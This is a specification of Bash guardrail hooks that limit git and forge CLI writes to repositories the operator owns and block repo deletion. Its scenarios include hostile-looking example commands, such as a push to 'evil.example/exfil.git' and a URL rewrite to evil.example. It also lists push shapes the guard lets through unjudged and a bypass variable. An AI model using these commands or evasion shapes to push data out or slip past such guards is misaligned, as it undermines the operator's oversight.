# repo-ownership Specification

## Purpose
Repo ownership is the set of Bash hooks that keep writes on repositories the operator owns, refuse repository deletion, and advise when a repo is created or published: `cadence-hooks guardrails guard-push-remote`, `cadence-hooks guardrails guard-gh-write`, `cadence-hooks guardrails guard-forge-write`, `cadence-hooks guardrails guard-gh-dangerous`, `cadence-hooks guardrails inject-gh-write-context`, `cadence-hooks guardrails guard-git-init` and `cadence-hooks guardrails warn-going-public`.

## Requirements

### Requirement: Owner allowlist
The ownership guards SHALL read the operator's owners from `CADENCE_ALLOWED_OWNERS` and `owner/repo` pairs from `CADENCE_ALLOWED_REPOS` in the hook process environment, each a space- or comma-separated list matched case-insensitively. A bare entry MUST match only the default host (`GH_HOST`, else `github.com`) and hosts in `CADENCE_EXTRA_HOSTS`. A host-qualified entry (`host/owner`) MUST match only its own host. An inline prefix on the command MUST NOT change a verdict.

#### Scenario: Bare entry on the default host
- **WHEN** `CADENCE_ALLOWED_OWNERS=cameronsjo` and a push targets `https://github.com/CameronSjo/tool.git`
- **THEN** the target counts as owned

#### Scenario: Bare entry on a self-hosted forge
- **WHEN** `CADENCE_ALLOWED_OWNERS=cameron`, `CADENCE_EXTRA_HOSTS` is unset, and a push targets `https://git.example.com/cameron/tool.git`
- **THEN** the push nudges, and the nudge suggests qualifying the entry as `git.example.com/<owner>` or setting `CADENCE_EXTRA_HOSTS=git.example.com`

#### Scenario: Repo entry
- **WHEN** `CADENCE_ALLOWED_REPOS=external/shared-repo` and a write targets `external/shared-repo`
- **THEN** the target counts as owned while every other `external/*` repo does not

### Requirement: Push to a repository the operator does not own
`guard-push-remote` (PreToolUse, Bash) MUST NOT block. It SHALL nudge (exit 0, `Push target is not on your allowlist`) on a `git push` whose remote it read exactly (a URL, a named remote's push URL, or a bare push's tracking remote, in the directory the push walk followed) and whose owner is outside the allowlist, naming the remote and saying to confirm it or push to the fork. A push to owned remotes, and a command with no push, SHALL be allowed with no output.

#### Scenario: Ordinary push to an owned remote
- **WHEN** `git push origin feat/x` runs in a checkout whose `origin` is an owned GitHub repo
- **THEN** the hook exits 0 with no output

#### Scenario: Push to an unowned URL
- **WHEN** the command is `git push https://github.com/someone-else/repo.git main`
- **THEN** the hook exits 0 with a nudge that names the URL, the directory and the allowed entries, and says to confirm the remote or push to the fork

#### Scenario: Push text that is not a push
- **WHEN** the command is `git commit -m "remember to git push https://github.com/x/y.git"`
- **THEN** the hook allows with no output

#### Scenario: Chained pushes to owned remotes
- **WHEN** the command is `git push origin main && git push backup main` and both remotes are owned
- **THEN** the hook allows, each push judged on its own target

### Requirement: Push guard configuration and probe failures
`guard-push-remote` SHALL allow with no output when `CADENCE_ALLOWED_OWNERS` is empty, when the push runs in a directory that is not a git repository, and when a git probe exceeds the git-probe deadline (`CADENCE_HOOK_DEADLINE_MS`). It SHALL resolve at most four distinct directory and remote pairs per command and SHALL NOT judge the pushes past them.

#### Scenario: Unconfigured machine
- **WHEN** `CADENCE_ALLOWED_OWNERS` is unset and the command is `git push origin main`
- **THEN** the hook exits 0 with no output

#### Scenario: Not a repository
- **WHEN** an owner list is set and `git push origin main` runs in a directory with no git repository
- **THEN** the hook allows

#### Scenario: Probe timeout
- **WHEN** every git probe outlives the deadline and the command is `for x in 1; do git push r1 main; git push evilremote main; done`
- **THEN** the hook exits 0 with no output

### Requirement: gh write to a repository the operator does not own
`guard-gh-write` (PreToolUse, Bash) SHALL block (exit 2, `gh write targets repo you don't own`) a `gh` write on a repository outside the allowlist, judging each segment of a chain on its own target. The target SHALL be read from a PR or issue URL argument, `-R`/`--repo`, a `GH_REPO` assignment, a `gh repo` verb's positional `owner/repo`, a `gh api repos/<owner>/<repo>/...` path, and otherwise the git remotes of the directory the segment runs in. Reads SHALL be allowed whatever the target.

#### Scenario: Ordinary write with an owned target
- **WHEN** the command is `gh pr create -R cameronsjo/tool --title t --body-file b.md` and `cameronsjo` is allowed
- **THEN** the hook allows

#### Scenario: Unowned write after an owned one
- **WHEN** the command is `gh issue comment 1 -R cameronsjo/tool --body ok && gh issue comment 2 -R evil/repo --body x`
- **THEN** the hook exits 2 naming `evil/repo` and the allowed entries

#### Scenario: Read on an unowned repo
- **WHEN** the command is `gh pr view 5 -R someone/else` or `gh repo clone someone/else`
- **THEN** the hook allows

#### Scenario: Repo created from an owned template
- **WHEN** the command is `gh repo create --template cameronsjo/tpl work-org/x --private`
- **THEN** the hook exits 2 naming `work-org/x`, because under `gh repo create` `--template` and `-p` take the template as their value and the argument is the new repository

### Requirement: What counts as a gh write
`guard-gh-write` SHALL treat as writes: `gh pr|issue|release|label|repo|gist|workflow` with a mutating verb (`create`, `merge`, `close`, `comment`, `edit`, `delete`, `review`, `ready`, `reopen`, `lock`, `archive`, `rename`, `transfer`, `fork`, `run`, `enable`, `disable`), `gh secret|variable set|delete`, `gh release upload`, `gh label clone`, and `gh api` with a mutating `-X`/`--method`, a field flag or `--input`, unless an explicit `GET` method is given.

#### Scenario: API field write
- **WHEN** the command is `gh api repos/evil/repo/issues -f title=x`
- **THEN** the hook exits 2

#### Scenario: Explicit GET with fields
- **WHEN** the command is `gh api repos/evil/repo/issues -X GET -f state=open`
- **THEN** the hook allows

### Requirement: gh writes the guard cannot place
`guard-gh-write` SHALL block a write it cannot place on an owned repository: no `-R` and no resolvable remote (`Cannot determine target repo for gh write operation`), an unparseable or ambiguous `-R`, an unexpanded variable target, a fork checkout with an unowned fork or upstream, a `gh api` write outside `repos/<owner>/<repo>` and an allowed owner's `orgs/<org>`, a GraphQL mutation, and a command too large or nested to read. Each reason SHALL name a concrete fix.

#### Scenario: Write with no resolvable target
- **WHEN** `gh issue create --title t` runs in a directory with no git remote
- **THEN** the hook exits 2 and the reason tells the operator to add `-R <owner>/<repo>`

#### Scenario: GraphQL read and thread resolution
- **WHEN** the command is `gh api graphql -f query='query { viewer { login } }'` or a `resolveReviewThread` mutation
- **THEN** the hook allows

#### Scenario: Unconfigured machine
- **WHEN** `CADENCE_ALLOWED_OWNERS` is unset and the command is `gh pr merge 5 -R cameronsjo/tool`
- **THEN** the hook exits 2 with `Not configured`

### Requirement: gh writes allowed without an ownership check
`guard-gh-write` SHALL allow `gh gist` writes and `gh repo fork` (they land under the operator's account) and `gh issue create --web`/`-w` unless the command sets `BROWSER=` or `GH_BROWSER=`. A loop of writes that name no target SHALL be allowed when its body never changes directory and the directory resolves to an owned non-fork repository; with `CADENCE_GH_STRICT_LOOPS=1` it MUST block, with the fix "Loop fix targets" names. An ownership probe past the git-probe deadline MUST allow.

#### Scenario: Gist from an unowned checkout
- **WHEN** `gh gist create notes.md` runs in a checkout whose remote is unowned
- **THEN** the hook allows

#### Scenario: Strict loops
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and the command is `for n in 1 2; do gh issue close $n; done` in an owned checkout
- **THEN** the hook exits 2 and the reason suggests the resolved `-R owner/repo`

### Requirement: Untargeted gh write context
`inject-gh-write-context` (PreToolUse, Bash) SHALL nudge on every `gh` write segment that names no target (no `-R`, no `repos/owner/repo` path, no positional repo), restating that writes are allowlist-policed, that `-R owner/repo` should always be passed, and the allowed owners or that none are configured. It MUST repeat on every such write, MUST NOT block, and SHALL stay silent on reads and on writes that name their target.

#### Scenario: Bare write
- **WHEN** the command is `gh pr create --title t --body-file b.md`
- **THEN** the hook exits 0 with context naming `-R owner/repo` and the allowed owners

#### Scenario: Targeted write
- **WHEN** the command is `gh pr create -R cameronsjo/tool --title t --body-file b.md` with no bare `#N` in the body
- **THEN** the hook exits 0 with no output

### Requirement: Bare issue reference in a retargeted body
`inject-gh-write-context` SHALL nudge when `gh issue create|edit|comment` or `gh pr create|edit|comment|review` posts with `-R other/repo` a body holding a bare `#N` and `other/repo` is not the `origin` of the checkout the command runs in, advising `owner/repo#N`. It SHALL stay silent when no origin can be read.

#### Scenario: Cross-repo body
- **WHEN** the checkout's origin is `cameronsjo/cadence` and the command is `gh issue comment 4 -R cameronsjo/forgectl --body "see #12"`
- **THEN** the hook exits 0 with a nudge that a bare `#12` resolves against `cameronsjo/forgectl`

### Requirement: tea and glab writes
`guard-forge-write` (PreToolUse, Bash) SHALL block (exit 2) a `tea` or `glab` write whose target is outside the allowlist or cannot be read, and SHALL allow reads and any verb outside its write table. For `glab` the target is `-R`/`--repo`; a bare target MUST match a bare entry only on a host in `CADENCE_EXTRA_HOSTS` or a `gitlab.com/<owner>` entry, never on the GitHub default host. With no allowlist every write it reaches MUST block. `glab api` and `tea api` SHALL be allowed.

#### Scenario: Unowned GitLab write
- **WHEN** the command is `glab mr create -R evil/r --title t`
- **THEN** the hook exits 2 naming `glab write targets` and the allowed entries

#### Scenario: GitLab read
- **WHEN** the command is `glab mr list -R evil/r`
- **THEN** the hook allows

### Requirement: tea targets read as tea reads them
For `tea` the target SHALL be `--repo`/`-r` (`-R` is tea's `--remote`), its first two `/` parts being owner and repo. A bare slug MUST be owned on every tea login host (the `--login` one, else every saved login, plus a `GITEA_INSTANCE_URL` host). Only when tea's config is missing, empty, comment-only or `logins: []` does `CADENCE_EXTRA_HOSTS` decide.

#### Scenario: Bare tea slug on the login host
- **WHEN** tea's only login is `https://git.sjo.lol`, `git.sjo.lol/cameron` is allowed, and the command is `tea pr create --repo cameron/lectern`
- **THEN** the hook allows

#### Scenario: Single-dash login flag
- **WHEN** the checkout's remote is owned and the command is `tea pr create --title t -login work`, where `work` is a login on an unowned host
- **THEN** the hook exits 2

#### Scenario: Host-qualified tea slug
- **WHEN** the command is `tea pr create --repo git.sjo.lol/cameron/lectern`
- **THEN** the hook exits 2 naming `tea write targets git.sjo.lol/cameron`, since tea reads owner `git.sjo.lol`

### Requirement: tea flags read as tea's parser reads them
tea's flags SHALL be read as tea's parser (urfave/cli v3) reads them: one or two dashes, a name or alias, `=` or the next word, and none after `--`, a lone `-`, or `-` plus a byte that is not an ASCII letter. The value flags SHALL be the ones tea 0.16 defines for the judged writes.

#### Scenario: Comment body that ends tea's flags
- **WHEN** the checkout's remote is unowned and the command is `tea comment 5 "- fixed" --repo cameron/x`
- **THEN** the hook exits 2, since tea reads `--repo cameron/x` as comment text and writes to the checkout's repo

### Requirement: tea writes judged on their directory
A `tea` `pulls`, `issues` or `comment` write with no `--repo` or `--owner` SHALL be judged on the git remotes of the directory it runs in (payload `cwd`, literal `cd`s, `env -C`); every remote, or the `--remote` one, MUST be owned, and on the login host when `--login` or `GITEA_INSTANCE_URL` moves it. No readable two-part remote MUST block as unreadable.

#### Scenario: tea write in an owned checkout
- **WHEN** the command is `cd <repo> && tea pr create --title t` and every remote of `<repo>` is an owned repo
- **THEN** the hook allows

#### Scenario: Login on another host
- **WHEN** the checkout's remote is owned on `git.sjo.lol` and the command is `tea pr create --title t --login work`, where `work` is a login on an unowned host
- **THEN** the hook exits 2

### Requirement: tea targets the guard cannot read
`guard-forge-write` MUST block as unreadable a `tea` write whose `--repo`/`--owner` is not a literal `owner/repo`, whose `--repo` names an existing directory, that is `repos create|delete` without `--owner`, that carries a near miss of a repo, login, remote or owner flag (`--rep`, `-logi`) or an unknown flag followed by a `-` word, or that sets a `GITEA_*` variable tea reads in front of `tea`. Each is a shape where tea's write target can differ from what the guard read.

#### Scenario: Repo from a variable
- **WHEN** the command is `tea pr create --repo "$REPO"` in an owned checkout
- **THEN** the hook exits 2 with rule `forge-write-target-unresolvable`

### Requirement: tea environment the guard cannot read
`guard-forge-write` MUST block as unreadable a `tea` write when anywhere in the command an assignment, `export` or `unset` touches `GITEA_INSTANCE_URL`, `HOME` or `XDG_CONFIG_HOME`, or `env -i`/`env -u` runs. Each can move the config or login tea uses away from the one the guard reads.

#### Scenario: Config home exported earlier in the command
- **WHEN** the command is `export XDG_CONFIG_HOME=/x; tea pr create --repo cameron/lectern`
- **THEN** the hook exits 2 with rule `forge-write-target-unresolvable`

### Requirement: tea login config the guard cannot read
A `tea` write judged on a login host MUST block when tea's config has a login the guard cannot read (an entry without a plain `name:` and `url:`, a list at the key's column, an inline list, a file over 1 MiB, or content yielding no login), or a literal `--login` names no saved login. It MUST NOT fall back to `CADENCE_EXTRA_HOSTS`; only a missing, empty, comment-only or `logins: []` config does.

#### Scenario: One unreadable login with extra hosts set
- **WHEN** `CADENCE_EXTRA_HOSTS` names the owned host and tea's config has a readable `sjo` login and a `work` login written with a quoted `"url":` key
- **THEN** `tea pr create --repo cameron/lectern` exits 2

### Requirement: Repository deletion
`guard-gh-dangerous` (PreToolUse, Bash) SHALL block (exit 2, `gh repo delete is blocked`) `gh repo delete` and `gh api -X DELETE repos/<owner>/<repo>` on any repository, owned or not, including inside shell wrappers, a literal piped into a shell, and quoted or brace-built spellings the shell runs as a delete. It SHALL block a `gh` command too large to read when its text could spell a delete. Other `gh` commands, and the phrase in quoted prose, SHALL be allowed.

#### Scenario: Owned repo deletion
- **WHEN** the command is `gh repo delete cameronsjo/tool --yes` and `cameronsjo` is allowed
- **THEN** the hook exits 2 with a fix to delete manually on github.com

#### Scenario: Ordinary gh command
- **WHEN** the command is `gh repo view cameronsjo/tool`
- **THEN** the hook allows

#### Scenario: API delete of a sub-resource
- **WHEN** the command is `gh api -X DELETE repos/cameronsjo/tool/labels/bug`
- **THEN** `guard-gh-dangerous` allows

### Requirement: Protected ownership guards
`CADENCE_DISABLE` MUST NOT switch off `guard-gh-write` or `guard-gh-dangerous`: the name is reported as refused and the guard still runs. `CADENCE_BYPASS=1` SHALL switch them off. `guard-push-remote`, `guard-forge-write`, `inject-gh-write-context`, `guard-git-init` and `warn-going-public` SHALL honour `CADENCE_DISABLE`. Every hook here SHALL run unchanged under `CLAUDE_CODE_REMOTE=true`.

#### Scenario: Disable refused
- **WHEN** `CADENCE_DISABLE=guard-gh-write` and the command writes to an unowned repo
- **THEN** the write still blocks

#### Scenario: Push nudge switched off
- **WHEN** `CADENCE_DISABLE=guard-push-remote` and `guardrails guard-push-remote` runs
- **THEN** it exits 0 without reading stdin

### Requirement: New repository reminder
`guard-git-init` (PostToolUse, Bash) SHALL nudge after `git init` or `gh repo create` to run `/a-star-is-born` and to confirm the license with the author before assuming one. A `git init` whose every created repository resolves under a temp root (`$TMPDIR`, `/tmp`, a `mktemp -d` path) SHALL be silent; `gh repo create` MUST nudge from any directory. It MUST NOT block and SHALL ignore the commands inside quoted prose.

#### Scenario: Real project
- **WHEN** `git init ~/Projects/new-tool` completes
- **THEN** the hook exits 0 with context naming `/a-star-is-born` and the license decision

#### Scenario: Test fixture
- **WHEN** `d=$(mktemp -d) && git init "$d"` completes
- **THEN** the hook exits 0 with no output

### Requirement: Going-public term scan
`warn-going-public` (PreToolUse, Bash) SHALL nudge, never block, when `gh repo create` (any visibility), `gh repo rename`, or `gh repo edit` with a public visibility carries a name or `--description` matching a compiled home-media term (the `*arr` family and similar), a `CADENCE_GOING_PUBLIC_TERMS` term, or a work term from `~/.config/cadence/redaction.toml`. Any parse problem SHALL allow.

#### Scenario: Sensitive name
- **WHEN** the command is `gh repo create sonarr-stack --public`
- **THEN** the hook exits 0 with a nudge naming `sonarr` and `CADENCE_GOING_PUBLIC_IGNORE`

#### Scenario: Neutral repository
- **WHEN** the command is `gh repo create cli-tools --public --description "small shell helpers"`
- **THEN** the hook exits 0 with no output

### Requirement: Going-public relief
`CADENCE_GOING_PUBLIC_IGNORE` SHALL relieve compiled and `CADENCE_GOING_PUBLIC_TERMS` terms and MUST NOT relieve a `redaction.toml` term, which only that file's own `allow` entries relieve. Both variables MUST be read from the session environment, not from an inline prefix on the command.

#### Scenario: Inline ignore prefix
- **WHEN** the command is `CADENCE_GOING_PUBLIC_IGNORE=sonarr gh repo create sonarr-stack` and the session environment does not set it
- **THEN** the hook still nudges

### Requirement: gh writes in a loop the parser cannot read
`guard-gh-write` MUST NOT block a loop the loop parser cannot read (past its 12 KB cap or time budget, or a syntax error) for that alone. It SHALL judge each gh write in the loop on its own, as outside a loop, and SHALL nudge on a judged write with no `-R`, `gh repo` positional `owner/repo`, `GH_REPO` or literal `repos/<owner>/<repo>/…` path, naming `-R owner/repo`. Under `CADENCE_GH_STRICT_LOOPS=1`, "Strict loops the parser cannot read" decides instead.

#### Scenario: Unreadable loop with an unowned target
- **WHEN** a comment takes `for i in 1 2; do gh issue close $i -R evil/x; done` past 12 KB
- **THEN** the hook exits 2 because the write targets a repo the operator does not own

#### Scenario: Unreadable loop with a directory it cannot follow
- **WHEN** a comment takes `for d in a b; do cd "$d"; gh issue close 1; done` past 12 KB, in an owned checkout
- **THEN** the hook exits 2 because the write's directory cannot be resolved

#### Scenario: Unreadable loop of targeted writes or reads
- **WHEN** a comment takes `for i in 1 2; do gh issue close $i -R cameronsjo/tool; done`, `for r in a b; do gh repo edit cameronsjo/tool --description $r; done` or `for i in 1 2; do gh pr view $i; done` past 12 KB
- **THEN** the hook allows with no output

#### Scenario: Unreadable loop with a write that names no target
- **WHEN** a comment takes `for i in 1 2; do gh issue close $i; done` past 12 KB, in an owned checkout
- **THEN** the hook exits 0 with a nudge to give every gh write in the loop `-R owner/repo`

#### Scenario: Strict loops past the parse cap
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and a comment takes `for n in 1 2; do gh issue close $n; done` past 12 KB, in an owned checkout
- **THEN** the hook exits 2 and the reason tells the operator to give every gh write in the loop `-R owner/repo`

#### Scenario: Strict loops past the parse cap with targets
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and a comment takes `for n in 1 2; do gh issue close $n -R cameronsjo/tool; done` past 12 KB
- **THEN** the hook allows

### Requirement: gh writes in a loop the parser reads
In a loop the loop parser reads, `guard-gh-write` MUST block a gh write that names no target when the loop body changes directory or the directory does not resolve to an owned non-fork repository. A write names its target with `-R`, or for `gh repo archive`, `delete`, `edit` and `create`, which take no `-R`, with a repository argument whose owner is spelled out. The reason SHALL name `-R` as the fix, or that argument for those verbs.

#### Scenario: Loop that changes directory
- **WHEN** the command is `for d in a b; do cd $d; gh issue close 1; done` in an owned checkout
- **THEN** the hook exits 2 and the reason tells the operator to add `-R`

#### Scenario: Loop in an unowned checkout
- **WHEN** the command is `for n in 1 2; do gh issue close $n; done` in a checkout whose remote is unowned
- **THEN** the hook exits 2

#### Scenario: Loop of repo archives under an allowed owner
- **WHEN** the command is `for r in a b; do gh repo archive "cameronsjo/$r" --yes; done` in a directory with no git remote
- **THEN** the hook allows

#### Scenario: Loop of repo archives that changes directory
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and the command is `for d in a b; do cd "$d"; gh repo archive "cameronsjo/$d" --yes; done`
- **THEN** the hook allows, because the argument names the target wherever the loop runs

#### Scenario: Loop of repo archives under an unowned owner
- **WHEN** the command is `for r in a b; do gh repo archive "evil/$r" --yes; done`, in any directory
- **THEN** the hook exits 2, because the per-segment check judges the owner `evil`

#### Scenario: Loop of repo archives with a variable owner
- **WHEN** the command is `for r in a b; do gh repo archive "$o/$r" --yes; done` in a directory with no git remote
- **THEN** the hook exits 2 and the reason names the repository argument (`gh repo archive owner/<repo>`), not `-R`

#### Scenario: Loop of repo creates from an owned template
- **WHEN** the command is `for r in a b; do gh repo create --template cameronsjo/tpl "work-org/$r" --private; done` in a directory with no git remote
- **THEN** the hook exits 2, because the template is not the target and the new repository's owner `work-org` is not allowed

### Requirement: Strict loops the parser cannot read
With `CADENCE_GH_STRICT_LOOPS=1`, `guard-gh-write` MUST block a command the loop parser cannot read when it shows a `for … in` or `while …; do` loop and holds a write judged for ownership that has no `-R`, `gh repo` positional `owner/repo` or literal `repos/<owner>/<repo>/…` path; a `GH_REPO` does not count. A write allowed without an ownership check stays allowed.

#### Scenario: Strict loops past the parse cap with a positional repo
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and a comment takes `for r in a b; do gh repo edit cameronsjo/tool --description $r; done` past 12 KB
- **THEN** the hook allows

#### Scenario: Strict loops past the parse cap with a gist
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and a comment takes `for i in 1 2; do gh gist create f$i.md; done` past 12 KB
- **THEN** the hook allows

### Requirement: gh write named by a PR or issue URL argument
On a `gh pr` or `gh issue` write verb that takes a `<number> | <url> | <branch>` argument, `guard-gh-write` SHALL judge the repo and host a PR or issue URL there names before `-R`, `GH_REPO` and the checkout; under `gh issue transfer` the URL is judged in addition to them. A loop check SHALL still read `-R`, or without one the checkout, first. A URL it cannot read for certain SHALL be judged as before. An unowned URL SHALL block with a fix that names no target. A flag's value SHALL NOT count.

#### Scenario: Unowned PR URL past an owned target
- **WHEN** the command is `gh pr merge https://github.com/evil/repo/pull/1 --squash -R cameronsjo/tool`, in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2 naming `github.com/evil/repo`, and the fix asks the user to run the command and names no `cameronsjo/` repo

#### Scenario: Owned issue URL outside an owned checkout
- **WHEN** the command is `gh issue close https://github.com/cameronsjo/tool/issues/3`, in a checkout of `evil/repo` or in `/tmp`
- **THEN** the hook allows

#### Scenario: URL as a flag's value
- **WHEN** the command is `gh pr comment 5 --body https://github.com/evil/repo/pull/1`, in a checkout of `cameronsjo/tool`
- **THEN** the hook allows

#### Scenario: Owned issue URL in a transfer from an unowned checkout
- **WHEN** the command is `gh issue transfer https://github.com/cameronsjo/tool/issues/3 evil/repo`, in a checkout of `evil/repo`
- **THEN** the hook exits 2 naming `evil/repo`

#### Scenario: Owned PR URL in a loop from an unowned checkout
- **WHEN** the command is `for n in 1 2; do gh pr merge https://github.com/cameronsjo/tool/pull/$n; done`, in a checkout of `evil/repo`
- **THEN** the hook exits 2

#### Scenario: Percent sign in the query
- **WHEN** the command is `gh pr merge 'https://github.com/evil/repo/pull/1/files?file-filters%5B%5D=.rs'`, in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2 naming `github.com/evil/repo`

#### Scenario: Percent sign in the path
- **WHEN** the command is `gh pr merge https://github.com/evil%2Drepo/x/pull/1`, in a checkout of `cameronsjo/tool`
- **THEN** the hook allows, judging the checkout as before

#### Scenario: Bad escape in the fragment
- **WHEN** the command is `gh pr merge 'https://github.com/evil/repo/pull/1#f%zz'`, in a checkout of `cameronsjo/tool`
- **THEN** the hook allows, judging the checkout as before

### Requirement: Push after an eval of text built at run time
`guard-push-remote` SHALL judge a push after an `eval` whose script is built at run time (`eval "$S"`, `eval "$(direnv export bash)"`) in the directory it read. When something it read may move the push (the `eval`'s words name `cd`, `pushd`, `popd` or `eval`, or hold a backslash, a variable the command names, or an unusual expansion; or the command defines a function, may replace a tool, or names a `GIT_` variable), and after a literal `eval`, it SHALL allow with no output.

#### Scenario: direnv line in an owned checkout
- **WHEN** the command is `eval "$(direnv export bash)"; git push origin feat` in a checkout whose `origin` is owned
- **THEN** the hook exits 0 with no output

#### Scenario: direnv line in an unowned checkout
- **WHEN** the command is `eval "$(direnv export bash)"; git push origin feat` in a checkout whose `origin` is not owned
- **THEN** the hook exits 0 with a `Push target is not on your allowlist` nudge

#### Scenario: A variable the command names
- **WHEN** the command is `S='cd /other'; eval "$S"; git push origin feat` in an unowned checkout
- **THEN** the hook exits 0 with no output

#### Scenario: A literal eval
- **WHEN** the command is `eval 'echo hi'; git push origin feat` in an unowned checkout
- **THEN** the hook exits 0 with no output

### Requirement: Loop fix targets
A `guard-gh-write` loop block SHALL name the directory's resolved repository in its fix only when gh sends every looped write there: the loop body stays in the directory, every gh write runs there when each segment is followed on its own, the command names no `GH_REPO`, `GH_HOST` or `GIT_DIR` and the hook's environment sets none, and each `gh api` write's path is `repos/{owner}/{repo}/…`. Every other fix SHALL hold a placeholder (`-R owner/repo`, `gh api repos/owner/repo/…`).

#### Scenario: Strict loop that stays in the checkout
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and the command is `for n in 1 2; do gh issue close $n; done` in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2 and the reason names `-R cameronsjo/tool`

#### Scenario: Loop that changes directory
- **WHEN** the command is `for d in a b; do (cd "$d" && gh release delete v1 --yes); done` in a checkout of `cameronsjo/tool`, with or without `CADENCE_GH_STRICT_LOOPS=1`
- **THEN** the hook exits 2 and the reason names `-R owner/repo`, not `cameronsjo/tool`

#### Scenario: Strict loop of an api path that names its own owner
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and the command is `for r in a b; do gh api -X DELETE "repos/work-org/$r/releases/1"; done` in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2 and the reason names `gh api repos/owner/repo/…`, not `cameronsjo/tool`

#### Scenario: Strict loop of an api path gh fills from the checkout
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and the command is `for b in x y; do gh api -X DELETE "repos/{owner}/{repo}/git/refs/heads/$b"; done` in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2 and the reason names `gh api repos/cameronsjo/tool/…`

#### Scenario: Strict loop under a GH_REPO
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and the command is `export GH_REPO=work-org/x; for n in 3 4; do gh pr merge $n --squash; done` in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2 and the reason names `-R owner/repo`, not `cameronsjo/tool`

#### Scenario: Strict loop after a cd in a subshell
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and the command is `(cd ../other && for n in 1 2; do gh pr merge $n; done)` in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2 and the reason names `-R owner/repo`, not `cameronsjo/tool`

### Requirement: Pushes the push guard does not judge
`guard-push-remote` SHALL allow with no output a push whose remote it did not read exactly (cadence-ecosystem ADR-0046 rule 3): a target or directory the shell builds at run time, a redirected or wrapped push, a `-c` override, a bare push after a possible branch switch, a URL with no `owner/repo`, or a remote git cannot resolve.

#### Scenario: Variable remote
- **WHEN** the command is `git push "$REMOTE" main` in an unowned checkout
- **THEN** the hook exits 0 with no output

#### Scenario: Variable directory
- **WHEN** the command is `cd "$REPO" && git push origin main` in an unowned checkout
- **THEN** the hook exits 0 with no output

#### Scenario: Rewritten push URL
- **WHEN** the command is `git -c url.https://evil.example/.insteadOf=https://github.com/ push origin main`
- **THEN** the hook exits 0 with no output

#### Scenario: Bare push after a branch switch
- **WHEN** the command is `git checkout other && git push` in an unowned checkout
- **THEN** the hook exits 0 with no output

#### Scenario: URL with no owner
- **WHEN** the command is `git push https://evil.example/exfil.git main`
- **THEN** the hook exits 0 with no output
